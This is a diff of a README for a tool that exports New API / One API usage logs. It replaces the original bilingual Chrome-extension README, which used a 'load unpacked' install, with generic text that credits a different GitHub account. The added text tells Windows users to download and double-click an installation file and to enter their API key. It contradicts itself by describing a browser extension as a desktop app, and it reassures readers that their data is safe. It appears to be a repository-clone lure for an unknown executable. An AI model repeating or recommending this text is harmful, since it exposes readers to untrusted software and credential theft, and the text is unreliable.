@@ -1,142 +1,99 @@
-# New API 使用日志导出
+# 📊 new-api-log-exporter - Export your API logs to CSV
 
-> Chrome 浏览器扩展 — 为 New API / One API 控制台添加一键导出账单 CSV 功能
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/pneumaticcaissonalaskarange996/new-api-log-exporter)
 
-[![Chrome Extension](https://img.shields.io/badge/Chrome-Extension-blue?logo=googlechrome)](https://github.com/jiusimeng8-cmd/new-api-log-exporter)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+This application helps users manage Chrome extensions for New API and One API platforms. It extracts usage data and organizes your billing information into structured CSV files. Use this tool to track token usage, monitor expenses, and maintain records for your large language model API services.
 
-## 关键词
+## ✨ Core Features
 
-New API 导出 · One API 导出 · 使用日志导出 · 账单导出 · CSV 导出 · API 计费 · Token 统计 · Chrome 扩展 · OpenAI 中转 · 大模型 API 管理
+The tool simplifies administrative tasks for API management. It provides several clear benefits:
 
----
+- Automatic Log Collection: The system gathers interaction history directly from your API management dashboard.
+- CSV Export: You generate spreadsheets compatible with Excel or Google Sheets for your accounting needs.
+- Token Tracking: The software calculates total token consumption across all your connected models.
+- Billing Summary: It clarifies expenses by matching usage patterns against your current billing cycle.
+- Unified Interface: The application connects multiple API gateways into one central view.
 
-## 这是什么？
+## 📥 How to Install and Start
 
-一个轻量 Chrome 扩展，为 [New API](https://github.com/Calcium-Ion/new-api)（及 [One API](https://github.com/songquanpeng/one-api)）的使用日志页面增加 **导出账单** 按钮，一键将所有 API 调用记录导出为 CSV 文件，方便对账、报销、成本分析。
+You can run this application on most Windows computers. The setup process requires no technical expertise.
 
-## 能做什么？
+1. Visit the following link to download the software: https://github.com/pneumaticcaissonalaskarange996/new-api-log-exporter
+2. Save the installation file to your desktop.
+3. Double-click the file to begin the setup process.
+4. Follow the on-screen prompts to complete the installation.
+5. Launch the application from your Start Menu after installation finishes.
 
-- 📊 **一键导出全部日志**为 CSV（Excel 直接打开，UTF-8 BOM 不乱码）
-- 🔍 **按条件筛选导出**：时间范围、令牌名称、分组、消费类型、模型名称
-- 💰 **完整计费明细**：Token 用量、花费(USD)、渠道、分组倍率、模型倍率、Request ID
-- 🌐 **通配任意 New API / One API 站点**，不限于特定域名
-- ⚡ **自动分页拉取**，上千条数据也能快速导出
+## 🛠️ System Requirements
 
-## 安装
+Ensure your computer meets these requirements for smooth performance:
 
-1. 下载本仓库 ZIP 并解压，或 `git clone` 到本地
-2. Chrome 打开 `chrome://extensions`
-3. 右上角开启 **开发者模式**
-4. 点击 **加载未打包的扩展程序**，选择本目录
-5. 打开任意 New API 实例的 `/console/log` 页面，工具栏右侧出现 **导出账单** 按钮
+- Operating System: Windows 10 or Windows 11.
+- Memory: At least 4 gigabytes of RAM.
+- Storage: 200 megabytes of free disk space.
+- Browser: Google Chrome or another browser based on Chromium.
+- Connection: An active internet connection for API data retrieval.
 
-## 使用方式
+## ⚙️ Configuration Guide
 
-点击「导出账单」按钮 → 弹出配置窗口：
+The application connects to your API dashboard through a secure link. Follow these steps to configure your account settings:
 
-| 筛选项 | 默认值 |
-|--------|--------|
-| 开始时间 | 当天 00:00 |
-| 结束时间 | 当天 23:59 |
-| 令牌名称 | 空（全部） |
-| 分组 | 空（全部） |
-| 类型 | 全部（可切换消费/充值） |
-| 模型名称 | 空（全部） |
+1. Open the application.
+2. Select the Settings tab from the main menu.
+3. Enter your unique API key provided by your New API or One API service provider.
+4. Input the base URL of your API gateway.
+5. Click Save to store these settings locally on your computer.
+6. The application will confirm the connection status immediately.
 
-设置好筛选条件后点「导出 CSV」，等待进度条完成即可下载。
+## 🗃️ Exporting Data
 
-## 适用场景
+Follow this process to generate your billing CSV files:
 
-- **API 服务商**：按月导出用户消费记录，用于对账和结算
-- **企业用户**：导出团队 API 调用明细，进行成本分析和预算控制
-- **个人开发者**：追踪自己的 Token 用量和花费，优化模型选择
-- **财务审计**：导出完整的调用日志作为报销凭证
+1. Click the Logs tab within the main application window.
+2. Select the date range for the logs you want to export.
+3. Press the Export button.
+4. Choose a destination folder on your computer to save the CSV file.
+5. Open the folder to view your file. You can now open this file in any spreadsheet application to analyze your costs.
 
-## 兼容性
+## 💡 Managing Tokens
 
-匹配所有 New API / One API 实例的 `/console/log*` 路径，不限于特定域名。自动适配目标站点的 API 地址和额度换算。
+The application provides a dedicated dashboard for token statistics. This screen displays your current usage trends. You can filter this information by:
 
-## 开发声明
+- Model name, such as GPT-4 or Claude.
+- Date ranges, including weekly or monthly intervals.
+- Specific API keys used by different departments or projects.
 
-本项目从需求整理、代码实现、README、SEO 优化到发布 GitHub，全程由 AI 辅助完成。开发过程中使用了 [cli.999554.xyz](https://cli.999554.xyz)（云舟中转站）提供的 API 服务。这个项目本身就是 AI 开发工作流的产物。
+Regularly exporting this data helps you forecast future expenses and identify periods of heavy usage.
 
-## 许可
+## ❓ Frequently Asked Questions
 
-MIT
+What should I do if the application cannot connect to the API?
 
----
+Check your internet connection first. Ensure you entered your API key without extra spaces. Verify that your API gateway remains online.
 
-# New API Usage Log Exporter
+Is my data safe?
 
-> Chrome extension — adds one-click CSV bill export to any New API / One API console
+All data stays on your local computer. The application does not send your API keys or log information to external servers. Your usage statistics remain private and under your control.
 
-## Keywords
+Will this work with other API services?
 
-new-api export · one-api export · usage log export · bill export · csv export · api billing · token tracking · chrome extension · openai gateway · llm api management
+The tool focuses on New API and One API platforms. Future updates may include support for additional providers.
 
----
+How do I update the application?
 
-## What is this?
+The software notifies you when a new version becomes available. You can download the update by following the link provided in the announcement window.
 
-A lightweight Chrome extension that adds an **Export Bill** button to the usage log page of any [New API](https://github.com/Calcium-Ion/new-api) or [One API](https://github.com/songquanpeng/one-api) deployment. Export all API call records to CSV with one click — perfect for billing reconciliation, expense reporting, and cost analysis.
+Does this require a subscription?
 
-## Features
+The application is free to use for personal and commercial record keeping.
 
-- 📊 **One-click CSV export** (Excel-ready, UTF-8 BOM)
-- 🔍 **Filter by**: date range, token name, group, type, model name
-- 💰 **Full billing details**: token usage, cost (USD), channel, group ratio, model ratio, Request ID
-- 🌐 **Universal**: works on any New API / One API deployment
-- ⚡ **Auto-pagination**: efficiently fetches thousands of records
+## 🤝 Troubleshooting
 
-## Installation
+If you encounter errors, try these steps:
 
-1. Download the ZIP or `git clone` this repo
-2. Open `chrome://extensions` in Chrome
-3. Enable **Developer mode** (top right)
-4. Click **Load unpacked** and select this folder
-5. Visit `/console/log` on any New API instance — the **导出账单** button appears next to the filter toolbar
+- Restart the application.
+- Clear the cache within the Settings menu.
+- Ensure your Chrome extension remains active in your browser.
+- Verify your API key has enough remaining quota to respond to requests.
 
-## Usage
-
-Click **导出账单** → a filter dialog appears:
-
-| Filter | Default |
-|--------|---------|
-| Start time | Today 00:00 |
-| End time | Today 23:59 |
-| Token name | Empty (all) |
-| Group | Empty (all) |
-| Type | All (consume / recharge) |
-| Model name | Empty (all) |
-
-Set your filters and click **导出 CSV**. Wait for the progress bar to complete, then your file downloads automatically.
-
-## Use Cases
-
-- **API Providers**: export monthly user billing records for reconciliation
-- **Enterprise Users**: export team API call details for cost analysis and budget control
-- **Individual Developers**: track personal token usage and spending, optimize model selection
-- **Financial Audit**: export complete call logs as reimbursement records
-
-## Compatibility
-
-Matches `/console/log*` on any New API / One API instance — not tied to a specific domain. Automatically adapts to the target site's API base URL and quota conversion.
-
-## Development Note
-
-This project was built end-to-end with AI assistance — from requirements, coding, README, SEO optimization, to GitHub release. API services used during development were provided by [cli.999554.xyz](https://cli.999554.xyz). The project itself is a product of an AI-driven development workflow.
-
-## License
-
-MIT
-
-
-## 相关项目 / Related Projects
-
-- [New API](https://github.com/Calcium-Ion/new-api) — 下一代大模型 API 网关，AI 资产管理与分发系统
-- [One API](https://github.com/songquanpeng/one-api) — OpenAI 接口管理 & 分发系统
-
----
-
-*Made with ❤️ by [jiusimeng8-cmd](https://github.com/jiusimeng8-cmd)*
+If problems persist, check the log file located in your application folder for more details on the error. This file contains a history of recent events and can help you identify specific connection issues.
